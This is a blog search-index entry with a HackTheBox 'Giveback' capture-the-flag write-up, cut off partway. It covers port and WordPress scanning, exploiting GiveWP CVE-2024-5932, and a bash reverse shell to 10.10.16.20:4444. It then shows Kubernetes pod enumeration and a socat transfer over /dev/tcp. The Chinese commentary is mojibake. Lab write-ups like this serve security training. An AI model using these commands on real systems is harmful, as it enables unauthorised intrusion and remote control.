<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HackTheBox-Giveback</title>
    <link href="/2025/11/18/HackTheBox-Giveback/"/>
    <url>/2025/11/18/HackTheBox-Giveback/</url>
    
    <content type="html"><![CDATA[<p>åšäº†ä¸€ä¸ªæä½ä½ è„–å­çš„æ¢¦</p><p>ï¸åœ¨é˜³å…‰æ­£å¥½çš„åˆå</p><p>ï¸ç”¨çœ¼æ³ªä»¿ä½›å¿«å¤ºçœ¶è€Œå‡ºçš„åŒçœ¼</p><p>çœ‹ç€ä½ çº¤ç»†çš„å¤´é¢ˆæŠ½æç€</p><hr><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code"> ./rustscan -a 10.10.11.94 --ulimit 5000</span><br>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.<br>| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;<span class="hljs-emphasis">__ &#123;_   _&#125;&#123; &#123;__</span>  /  <span class="hljs-emphasis">___&#125; / &#123;&#125; \ |  `| |</span><br><span class="hljs-emphasis">| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |</span><br><span class="hljs-emphasis">`-&#x27; `-&#x27;`-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;</span><br><span class="hljs-emphasis">The Modern Day Port Scanner.</span><br><span class="hljs-emphasis">__</span><span class="hljs-emphasis">_____</span><span class="hljs-emphasis">_____</span><span class="hljs-emphasis">_____</span><span class="hljs-emphasis">_____</span><span class="hljs-emphasis">_____</span><span class="hljs-emphasis">_____</span><span class="hljs-emphasis">_____</span>___<br><span class="hljs-meta">: http://discord.skerritt.blog</span>         :<br><span class="hljs-meta">: https://github.com/RustScan/RustScan</span> :<br><span class="hljs-code"> --------------------------------------</span><br>TreadStone was here ğŸš€<br><br>[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;<br>[~] Automatically increasing ulimit value to 5000.<br>Open 10.10.11.94:22<br>Open 10.10.11.94:80<br>Open 10.10.11.94:30686<br>[~] Starting Script(s)<br>[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-17 19:03 EST<br>Initiating Ping Scan at 19:03<br>Scanning 10.10.11.94 [4 ports]<br>Completed Ping Scan at 19:03, 0.11s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 19:03<br>Completed Parallel DNS resolution of 1 host. at 19:03, 0.01s elapsed<br>DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]<br>Initiating SYN Stealth Scan at 19:03<br>Scanning 10.10.11.94 [3 ports]<br>Discovered open port 80/tcp on 10.10.11.94<br>Discovered open port 22/tcp on 10.10.11.94<br>Discovered open port 30686/tcp on 10.10.11.94<br>Completed SYN Stealth Scan at 19:03, 0.16s elapsed (3 total ports)<br>Nmap scan report for 10.10.11.94<br>Host is up, received echo-reply ttl 63 (0.095s latency).<br>Scanned at 2025-11-17 19:03:40 EST for 0s<br><br>PORT      STATE SERVICE REASON<br>22/tcp    open  ssh     syn-ack ttl 63<br>80/tcp    open  http    syn-ack ttl 62<br>30686/tcp open  unknown syn-ack ttl 63<br><br>Read data files from: /usr/share/nmap<br>Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds<br><span class="hljs-code">           Raw packets sent: 7 (284B) | Rcvd: 4 (160B)</span><br><br></code></pre></td></tr></table></figure><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs less"> <span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">run</span> <span class="hljs-selector-tag">-it</span> <span class="hljs-selector-tag">--rm</span> <span class="hljs-selector-tag">wpscanteam</span>/<span class="hljs-selector-tag">wpscan</span> <span class="hljs-selector-tag">--url</span> <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//10.10.11.94/              </span><br><span class="hljs-selector-tag">_______________________________________________________________</span><br>         <span class="hljs-selector-tag">__</span>          <span class="hljs-selector-tag">_______</span>   <span class="hljs-selector-tag">_____</span><br>         \ \        / /  <span class="hljs-selector-tag">__</span> \ / <span class="hljs-selector-tag">____</span>|<br>          \ \  /\  / /| |<span class="hljs-selector-tag">__</span>) | (___   ___  __ _ _ __ Â®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version <span class="hljs-number">3.8</span>.<span class="hljs-number">28</span><br>       Sponsored by Automattic - <span class="hljs-attribute">https</span>:<span class="hljs-comment">//automattic.com/</span><br>       <span class="hljs-variable">@_WPScan_</span>, <span class="hljs-variable">@ethicalhack3r</span>, <span class="hljs-variable">@erwan_lr</span>, <span class="hljs-variable">@firefart</span><br>_______________________________________________________________<br><br>[i] It seems like you have <span class="hljs-keyword">not</span> updated the database for some time.<br>[?] Do you want to <span class="hljs-attribute">update</span> now? [Y]es [N]o, <span class="hljs-attribute">default</span>: [N]n<br>[+] <span class="hljs-attribute">URL</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.11.94/ [10.10.11.94]</span><br>[+] <span class="hljs-attribute">Started</span>: Tue Nov <span class="hljs-number">18</span> <span class="hljs-number">00</span>:<span class="hljs-number">35</span>:<span class="hljs-number">03</span> <span class="hljs-number">2025</span><br><br>Interesting <span class="hljs-built_in">Finding</span>(s):<br><br>[+] Headers<br> | Interesting <span class="hljs-attribute">Entry</span>: <span class="hljs-attribute">Server</span>: nginx/<span class="hljs-number">1.28</span>.<span class="hljs-number">0</span><br> | Found <span class="hljs-attribute">By</span>: Headers (Passive Detection)<br> | <span class="hljs-attribute">Confidence</span>: <span class="hljs-number">100%</span><br><br>[+] robots.txt <span class="hljs-attribute">found</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.11.94/robots.txt</span><br> | Interesting <span class="hljs-attribute">Entries</span>:<br> |  - /wp-admin/<br> |  - /wp-admin/admin-ajax.php<br> | Found <span class="hljs-attribute">By</span>: Robots Txt (Aggressive Detection)<br> | <span class="hljs-attribute">Confidence</span>: <span class="hljs-number">100%</span><br><br>[+] WordPress readme <span class="hljs-attribute">found</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.11.94/readme.html</span><br> | Found <span class="hljs-attribute">By</span>: Direct Access (Aggressive Detection)<br> | <span class="hljs-attribute">Confidence</span>: <span class="hljs-number">100%</span><br><br>[+] WordPress version <span class="hljs-number">6.8</span>.<span class="hljs-number">1</span> identified (Insecure, released on <span class="hljs-number">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">30</span>).<br> | Found <span class="hljs-attribute">By</span>: Emoji Settings (Passive Detection)<br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.11.94/, Match: &#x27;wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.1&#x27;</span><br> | Confirmed <span class="hljs-attribute">By</span>: Meta Generator (Passive Detection)<br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.11.94/, Match: &#x27;WordPress 6.8.1&#x27;</span><br><br>[+] WordPress theme in <span class="hljs-attribute">use</span>: bizberg<br> | <span class="hljs-attribute">Location</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.11.94/wp-content/themes/bizberg/</span><br> | Latest <span class="hljs-attribute">Version</span>: <span class="hljs-number">4.2</span>.<span class="hljs-number">9.79</span> (up to date)<br> | Last <span class="hljs-attribute">Updated</span>: <span class="hljs-number">2024</span><span class="hljs-attribute">-06-09T00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.000</span>Z<br> | <span class="hljs-attribute">Readme</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.11.94/wp-content/themes/bizberg/readme.txt</span><br> | Style <span class="hljs-attribute">URL</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.11.94/wp-content/themes/bizberg/style.css?ver=6.8.1</span><br> | Style <span class="hljs-attribute">Name</span>: Bizberg<br> | Style <span class="hljs-attribute">URI</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//bizbergthemes.com/downloads/bizberg-lite/</span><br> | <span class="hljs-attribute">Description</span>: Bizberg is a perfect theme for your business, corporate, restaurant, ingo, ngo, environment, nature,...<br> | <span class="hljs-attribute">Author</span>: Bizberg Themes<br> | Author <span class="hljs-attribute">URI</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//bizbergthemes.com/</span><br> |<br> | Found <span class="hljs-attribute">By</span>: Css Style In Homepage (Passive Detection)<br> | Confirmed <span class="hljs-attribute">By</span>: Css Style In <span class="hljs-number">404</span> Page (Passive Detection)<br> |<br> | <span class="hljs-attribute">Version</span>: <span class="hljs-number">4.2</span>.<span class="hljs-number">9.79</span> (<span class="hljs-number">80%</span> confidence)<br> | Found <span class="hljs-attribute">By</span>: Style (Passive Detection)<br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.11.94/wp-content/themes/bizberg/style.css?ver=6.8.1, Match: &#x27;Version: 4.2.9.79&#x27;</span><br><br>[+] Enumerating All Plugins (via Passive Methods)<br>[+] Checking Plugin Versions (via Passive <span class="hljs-keyword">and</span> Aggressive Methods)<br><br>[i] <span class="hljs-built_in">Plugin</span>(s) <span class="hljs-attribute">Identified</span>:<br><br>[+] *<br> | <span class="hljs-attribute">Location</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.11.94/wp-content/plugins/*/</span><br> |<br> | Found <span class="hljs-attribute">By</span>: Urls In Homepage (Passive Detection)<br> | Confirmed <span class="hljs-attribute">By</span>: Urls In <span class="hljs-number">404</span> Page (Passive Detection)<br> |<br> | The version could <span class="hljs-keyword">not</span> be determined.<br><br>[+] give<br> | <span class="hljs-attribute">Location</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.11.94/wp-content/plugins/give/</span><br> | Last <span class="hljs-attribute">Updated</span>: <span class="hljs-number">2025</span><span class="hljs-attribute">-11-05T14</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.000</span>Z<br> | [!] The version is out of date, the latest version is <span class="hljs-number">4.13</span>.<span class="hljs-number">0</span><br> |<br> | Found <span class="hljs-attribute">By</span>: Urls In Homepage (Passive Detection)<br> | Confirmed <span class="hljs-attribute">By</span>:<br> |  Urls In <span class="hljs-number">404</span> Page (Passive Detection)<br> |  Meta Tag (Passive Detection)<br> |  Javascript Var (Passive Detection)<br> |<br> | <span class="hljs-attribute">Version</span>: <span class="hljs-number">3.14</span>.<span class="hljs-number">0</span> (<span class="hljs-number">100%</span> confidence)<br> | Found <span class="hljs-attribute">By</span>: Query Parameter (Passive Detection)<br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.11.94/wp-content/plugins/give/assets/dist/css/give.css?ver=3.14.0</span><br> | Confirmed <span class="hljs-attribute">By</span>:<br> |  Meta Tag (Passive Detection)<br> |   - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.11.94/, Match: &#x27;Give v3.14.0&#x27;</span><br> |  Javascript Var (Passive Detection)<br> |   - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.11.94/, Match: &#x27;&quot;1&quot;,&quot;give_version&quot;:&quot;3.14.0&quot;,&quot;magnific_options&quot;&#x27;</span><br><br>[+] Enumerating Config Backups (via Passive <span class="hljs-keyword">and</span> Aggressive Methods)<br> Checking Config Backups - <span class="hljs-attribute">Time</span>: <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">17</span> &lt;============================================================================&gt; (<span class="hljs-number">137</span> / <span class="hljs-number">137</span>) <span class="hljs-number">100.00%</span> <span class="hljs-attribute">Time</span>: <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">17</span><br><br>[i] No Config Backups Found.<br><br>[!] No WPScan API Token given, as a result vulnerability data has <span class="hljs-keyword">not</span> been output.<br>[!] You can get a free API token with <span class="hljs-number">25</span> daily requests by registering at <span class="hljs-attribute">https</span>:<span class="hljs-comment">//wpscan.com/register</span><br><br>[+] <span class="hljs-attribute">Finished</span>: Tue Nov <span class="hljs-number">18</span> <span class="hljs-number">00</span>:<span class="hljs-number">35</span>:<span class="hljs-number">28</span> <span class="hljs-number">2025</span><br>[+] Requests <span class="hljs-attribute">Done</span>: <span class="hljs-number">173</span><br>[+] Cached <span class="hljs-attribute">Requests</span>: <span class="hljs-number">7</span><br>[+] Data <span class="hljs-attribute">Sent</span>: <span class="hljs-number">42.972</span> KB<br>[+] Data <span class="hljs-attribute">Received</span>: <span class="hljs-number">290.97</span> KB<br>[+] Memory <span class="hljs-attribute">used</span>: <span class="hljs-number">272.395</span> MB<br>[+] Elapsed <span class="hljs-attribute">time</span>: <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">24</span><br><br></code></pre></td></tr></table></figure><h3 id="GetShell1"><a href="#GetShell1" class="headerlink" title="GetShell1"></a>GetShell1</h3><hr><p>çˆ†ç ´ç”¨æˆ·åæ— æœï¼Œé€‰æ‹©ä»æ’ä»¶åˆ†æï¼ŒWPgiveæ’ä»¶æ˜¯ä½ç‰ˆæœ¬ï¼Œå­˜åœ¨å¯åˆ©ç”¨çš„CVEã€‚</p><p><a href="https://github.com/EQSTLab/CVE-2024-5932">EQSTLab&#x2F;CVE-2024-5932: GiveWP PHP Object Injection exploit</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> CVE-<span class="hljs-number">2024</span>-<span class="hljs-number">5932</span>-rce.py -u <span class="hljs-string">&quot;http://giveback.htb/donations/the-things-we-need/&quot;</span> -c <span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.20/4444 0&gt;&amp;1&#x27;&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs vim">â¤  ğŸ  Main Menu (<span class="hljs-keyword">m</span>) ğŸ’€ Payloads (<span class="hljs-keyword">p</span>) ğŸ”„ Clear (Ctrl-L) ğŸš« Quit (q/Ctrl-C)<br>[+] Got <span class="hljs-built_in">reverse</span> <span class="hljs-keyword">shell</span> from beta-vino-<span class="hljs-keyword">wp</span>-wordpress-<span class="hljs-number">685554584</span><span class="hljs-keyword">c</span>-sq2j9-<span class="hljs-number">10.10</span>.<span class="hljs-number">11.94</span>-Linux-x86_64 ğŸ˜ Assigned SessionID <span class="hljs-symbol">&lt;1&gt;</span><br>[+] Attempting <span class="hljs-keyword">to</span> upgrade <span class="hljs-keyword">shell</span> <span class="hljs-keyword">to</span> PTY...<br>[!] Python agent cannot <span class="hljs-keyword">be</span> deployed. I need <span class="hljs-keyword">to</span> maintain at least one basic session <span class="hljs-keyword">to</span> handle the PTY<br>[+] Attempting <span class="hljs-keyword">to</span> spawn <span class="hljs-keyword">a</span> <span class="hljs-built_in">reverse</span> <span class="hljs-keyword">shell</span> <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">16.20</span>:<span class="hljs-number">4444</span><br>[+] Got <span class="hljs-built_in">reverse</span> <span class="hljs-keyword">shell</span> from beta-vino-<span class="hljs-keyword">wp</span>-wordpress-<span class="hljs-number">685554584</span><span class="hljs-keyword">c</span>-sq2j9-<span class="hljs-number">10.10</span>.<span class="hljs-number">11.94</span>-Linux-x86_64 ğŸ˜ Assigned SessionID <span class="hljs-symbol">&lt;2&gt;</span><br>[+] Shell upgraded successfully using /usr/bin/script! ğŸ’ª<br>[+] Interacting with session [<span class="hljs-number">1</span>], Shell Type: PTY, Menu key: F12 <br>[+] Logging <span class="hljs-keyword">to</span> /root/.penelope/beta-vino-<span class="hljs-keyword">wp</span>-wordpress-<span class="hljs-number">685554584</span><span class="hljs-keyword">c</span>-sq2j9~<span class="hljs-number">10.10</span>.<span class="hljs-number">11.94</span>_Linux_x86_64/<span class="hljs-number">2025</span>_11_17-<span class="hljs-number">19</span>_45_05-<span class="hljs-number">633</span>.<span class="hljs-built_in">log</span> ğŸ“œ<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>id<br>uid=<span class="hljs-number">1001</span> gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root),<span class="hljs-number">1001</span><br>I have <span class="hljs-keyword">no</span> name!@beta-vino-<span class="hljs-keyword">wp</span>-wordpress-<span class="hljs-number">685554584</span><span class="hljs-keyword">c</span>-sq2j9:/<span class="hljs-keyword">opt</span>/bitnami/wordpress/<span class="hljs-keyword">wp</span>-admin$ <br><br></code></pre></td></tr></table></figure><p>ä¸æ˜¯æˆ‘è¯´ï¼Œç›´æ¥rootï¼Ÿ</p><p>è‚¯å®šæ˜¯ä¸ªè™šæ‹Ÿæœºã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs routeros">I have <span class="hljs-literal">no</span> name!@beta-vino-wp-wordpress-685554584c-sq2j9:/opt/bitnami/wordpress/wp-admin$ env<br><span class="hljs-attribute">SHELL</span>=/usr/bin/bash<br><span class="hljs-attribute">BETA_VINO_WP_MARIADB_SERVICE_PORT</span>=3306<br><span class="hljs-attribute">KUBERNETES_SERVICE_PORT_HTTPS</span>=443<br>WORDPRESS_SMTP_PASSWORD=<br>WORDPRESS_SMTP_FROM_EMAIL=<br><span class="hljs-attribute">BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PORT</span>=443<br><span class="hljs-attribute">WEB_SERVER_HTTP_PORT_NUMBER</span>=8080<br><span class="hljs-attribute">WORDPRESS_RESET_DATA_PERMISSIONS</span>=<span class="hljs-literal">no</span><br><span class="hljs-attribute">KUBERNETES_SERVICE_PORT</span>=443<br><span class="hljs-attribute">WORDPRESS_EMAIL</span>=user@example.com<br><span class="hljs-attribute">WP_CLI_CONF_FILE</span>=/opt/bitnami/wp-cli/conf/wp-cli.yml<br><span class="hljs-attribute">WORDPRESS_DATABASE_HOST</span>=beta-vino-wp-mariadb<br><span class="hljs-attribute">MARIADB_PORT_NUMBER</span>=3306<br><span class="hljs-attribute">MODULE</span>=wordpress<br><span class="hljs-attribute">WORDPRESS_SMTP_FROM_NAME</span>=FirstName LastName<br><span class="hljs-attribute">HOSTNAME</span>=beta-vino-wp-wordpress-685554584c-sq2j9<br>WORDPRESS_SMTP_PORT_NUMBER=<br><span class="hljs-attribute">BETA_VINO_WP_MARIADB_PORT_3306_TCP_PROTO</span>=tcp<br>WORDPRESS_EXTRA_CLI_ARGS=<br><span class="hljs-attribute">APACHE_BASE_DIR</span>=/opt/bitnami/apache<br><span class="hljs-attribute">LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PORT</span>=5000<br><span class="hljs-attribute">APACHE_VHOSTS_DIR</span>=/opt/bitnami/apache/conf/vhosts<br><span class="hljs-attribute">WEB_SERVER_DEFAULT_HTTP_PORT_NUMBER</span>=8080<br><span class="hljs-attribute">WP_NGINX_SERVICE_PORT_80_TCP</span>=tcp://10.43.4.242:80<br><span class="hljs-attribute">WORDPRESS_ENABLE_DATABASE_SSL</span>=<span class="hljs-literal">no</span><br><span class="hljs-attribute">WP_NGINX_SERVICE_PORT_80_TCP_PROTO</span>=tcp<br><span class="hljs-attribute">APACHE_DAEMON_USER</span>=daemon<br><span class="hljs-attribute">BITNAMI_ROOT_DIR</span>=/opt/bitnami<br><span class="hljs-attribute">LEGACY_INTRANET_SERVICE_SERVICE_HOST</span>=10.43.2.241<br><span class="hljs-attribute">WORDPRESS_BASE_DIR</span>=/opt/bitnami/wordpress<br><span class="hljs-attribute">WORDPRESS_SCHEME</span>=http<br>WORDPRESS_LOGGED_IN_SALT=<br><span class="hljs-attribute">BETA_VINO_WP_WORDPRESS_PORT_80_TCP</span>=tcp://10.43.61.204:80<br><span class="hljs-attribute">WORDPRESS_DATA_TO_PERSIST</span>=wp-config.php wp-content<br><span class="hljs-attribute">WORDPRESS_HTACCESS_OVERRIDE_NONE</span>=<span class="hljs-literal">no</span><br>WORDPRESS_DATABASE_SSL_CERT_FILE=<br><span class="hljs-attribute">APACHE_HTTPS_PORT_NUMBER</span>=8443<br><span class="hljs-attribute">PWD</span>=/opt/bitnami/wordpress/wp-admin<br><span class="hljs-attribute">OS_FLAVOUR</span>=debian-12<br>WORDPRESS_SMTP_PROTOCOL=<br><span class="hljs-attribute">WORDPRESS_CONF_FILE</span>=/opt/bitnami/wordpress/wp-config.php<br><span class="hljs-attribute">LEGACY_INTRANET_SERVICE_PORT_5000_TCP</span>=tcp://10.43.2.241:5000<br><br></code></pre></td></tr></table></figure><p>å†…éƒ¨å¼€æ”¾äº†å¾ˆå¤šç«¯å£ï¼Œè¿˜æœ‰KUBERNETESï¼Œæ¨æµ‹æ˜¯ä¸ªk8sé›†ç¾¤ã€‚</p><p>å…ˆå»5000ç«¯å£çœ‹çœ‹ã€‚</p><p>æˆ‘çš„å¤©è¿™bå®¹å™¨å•¥å‘½ä»¤éƒ½ä¸ç»™ç”¨å•Šï¼Œå…ˆçœ‹çœ‹å†…ç½‘æœåŠ¡ã€‚</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">I have no name!@beta-vino-wp-wordpress-685554584c-sq2j9:/tmp$ cat /etc/hosts<br># Kubernetes-managed hosts file.<br><span class="hljs-number">127.0.0.1</span>       localhost<br>::<span class="hljs-number">1</span>     localhost ip6-localhost ip6-loopback<br>fe00::<span class="hljs-number">0</span> ip6-localnet<br>fe00::<span class="hljs-number">0</span> ip6-mcastprefix<br>fe00::<span class="hljs-number">1</span> ip6-allnodes<br>fe00::<span class="hljs-number">2</span> ip6-allrouters<br><span class="hljs-number">10.42.1.249</span>     beta-vino-wp-wordpress-685554584c-sq2j9<br><br># Entries added by HostAliases.<br><span class="hljs-number">127.0.0.1</span>       status.localhost<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œé‡‡ç”¨Enchanterå¸ˆå‚…æä¾›çš„ä¼ è¾“æ–¹æ³•ã€‚</p><p>kaliï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvnp <span class="hljs-number">9999</span> &lt; socat-linux-amd64 <br></code></pre></td></tr></table></figure><p>å—å®³æœºå™¨ï¼š</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">I have <span class="hljs-keyword">no</span> name!@<span class="hljs-built_in">beta</span>-vino-wp-wordpress<span class="hljs-number">-685554584</span>c-sq2j9:/tmp<span class="hljs-symbol">$</span> exec <span class="hljs-number">3</span>&lt;&gt;/dev/tcp/<span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.20</span>/<span class="hljs-number">9999</span> <br>I have <span class="hljs-keyword">no</span> name!@<span class="hljs-built_in">beta</span>-vino-wp-wordpress<span class="hljs-number">-685554584</span>c-sq2j9:/tmp<span class="hljs-symbol">$</span> cat &lt;&amp;<span class="hljs-number">3</span> &gt; socat<br>I have <span class="hljs-keyword">no</span> name!@<span class="hljs-built_in">beta</span>-vino-wp-wordpress<span class="hljs-number">-685554584</span>c-sq2j9:/tmp<span 